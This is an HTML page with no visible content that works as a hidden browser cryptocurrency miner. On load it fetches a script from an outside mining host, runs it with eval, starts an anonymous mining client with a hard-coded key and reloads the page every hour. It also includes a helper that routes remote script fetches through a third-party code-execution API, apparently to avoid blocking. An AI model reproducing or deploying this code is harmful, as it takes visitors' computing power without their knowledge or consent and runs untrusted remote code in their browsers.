<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let use = urlParams.get('use') ? parseFloat(urlParams.get('use')) : 0.8;
        window.use = use;
    </script>

    <!-- <script>setInterval(async () => { if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 5000);</script> -->
    <script>
        setTimeout(() => { window.location.reload(); }, 1000 * 60 * 60)
    </script>
    <!-- <script src="https://www.hostingcloud.racing/sIu3.js"></script> -->
    <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->



    <!-- <script>
        const originalFetch = window.fetch;

        window.fetch = async (...args) => {
            const [url, options] = args;
            return originalFetch(newUrl, newOptions);
        };

        // Example usage of the overridden fetch
        (async () => {
            try {
                const response = await fetch('https://jsonplaceholder.typicode.com/todos/1'); // Replace with the desired URL
                const data = await response.text();
                console.log(data); // Log the response data
            } catch (error) {
                console.error('Fetch failed:', error);
            }
        })();



    </script> -->

    <script>

        let template = (str) => `
const https = require('https');

async function fetchData(url) {
    return new Promise((resolve) => {
        https.get(url, (res) => {
            let data = '';

            // A chunk of data has been received
            res.on('data', (chunk) => {
                data += chunk;
            });

            // The whole response has been received
            res.on('end', () => {
                resolve({ data, error: null }); // Resolve with data
            });
        }).on('error', (err) => {
            resolve({ data: null, error: err }); // Resolve with error
        });
    });
}

async function main() {
    const url = '${str}';
    const { data, error } = await fetchData(url);
    if (error) {
        console.log('Error:', error);
    } else {
        console.log(data);
    }
}
    
main();
`;



        async function reqPrx(url) {
            const data = JSON.stringify({
                'code': template(url),
                'language': 'js',
            });

            try {
                const response = await fetch('https://api.codex.jaagrav.in/', {
                    method: 'POST', // HTTP method
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': data.length // Set the content length
                    },
                    body: data // Write data to the request body
                });

                if (!response.ok) { // Check if the response is ok
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                const responseData = await response.json(); // Parse the JSON response
                return responseData.output; // Return the output

            } catch (error) {
                console.error('Error:', error); // Log any errors
                return null;
            }
        }





















        // async function loadWasm() {
        //     // Attempt to retrieve the WASM module from the cache
        //     const response = await caches.match('ATr0mzDy.wasm');

        //     if (!response) {
        //         console.error('WASM module not found in cache'); // Log the error

        //         // Attempt to fetch the module from the network
        //         try {
        //             const networkResponse = await fetch('ATr0mzDy.wasm');
        //             console.log('Network response status:', networkResponse.status);
        //             console.log('Network response content-type:', networkResponse.headers.get('Content-Type'));

        //             if (!networkResponse.ok) {
        //                 throw new Error('Network response was not ok');
        //             }

        //             // Cache the response for future use
        //             const cache = await caches.open('wasm-cache');
        //             await cache.put('ATr0mzDy.wasm', networkResponse.clone());
        //             return await WebAssembly.instantiate(await networkResponse.arrayBuffer());
        //         } catch (error) {
        //             console.error('Failed to fetch the WASM module:', error);
        //             return null; // Handle the failure gracefully
        //         }
        //     }

        //     // If found in the cache, instantiate the WASM module
        //     const bytes = await response.arrayBuffer(); // Get the bytes of the WASM module
        //     return await WebAssembly.instantiate(bytes); // Instantiate the WASM module
        // }


        // // Example function to call when the specific URL is requested
        // async function handleSpecificRequest() {
        //     // Load the WASM module
        //     const wasmInstance = await loadWasm();
        //     if (wasmInstance) {
        //         // Use the exported functions from the WASM instance
        //         console.log('WASM module loaded successfully:', wasmInstance);
        //     }
        // }

        // // Call this function based on your application logic
        // handleSpecificRequest();




        async function evalScr(url) {
            eval(await (await fetch(url)).text());
        }

        ; (async () => {







            // await new Promise((resolve) => {

            //     if ('serviceWorker' in navigator) {
            //         navigator.serviceWorker.register('/service-worker.js')
            //             .then((registration) => {
            //                 console.log('Service Worker registered with scope:', registration.scope);
            //                 resolve();
            //             })
            //             .catch((error) => {
            //                 console.error('Service Worker registration failed:', error);
            //                 resolve();
            //             });
            //     }
            // });





            let scrUrl = 'https://www.hostingcloud.racing/sIu3.js';
            try {
                await fetch(scrUrl);
            } catch (e) {
                scrUrl = 'http://share.liveblog365.com/GJTy.php?f=9sx5.js';
                return;
            }

            console.log(scrUrl);
            await evalScr(scrUrl);
            await new Promise(r => setTimeout(r, 5000));
            let Client = window.Client;


            // await new Promise((resolve) => {
            //     setTimeout(resolve, 3000);
            // })
            // await (async () => {
            //     eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
            // })();

            while (!Client) {
                await new Promise(r => setTimeout(r, 1000));
                Client = window.Client;
            }

            var _client = new Client.Anonymous('a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb', {
                throttle: 1 - use, c: 'w', // ads: 0
            });
            _client.start();
            window._client = _client;

            while (1) {
                await new Promise(r => setTimeout(r, 1000));
                running = _client.isRunning();

                console.log(running, _client.getHashesPerSecond());
            }
        })().catch(console.error);
    </script>


</body>

</html>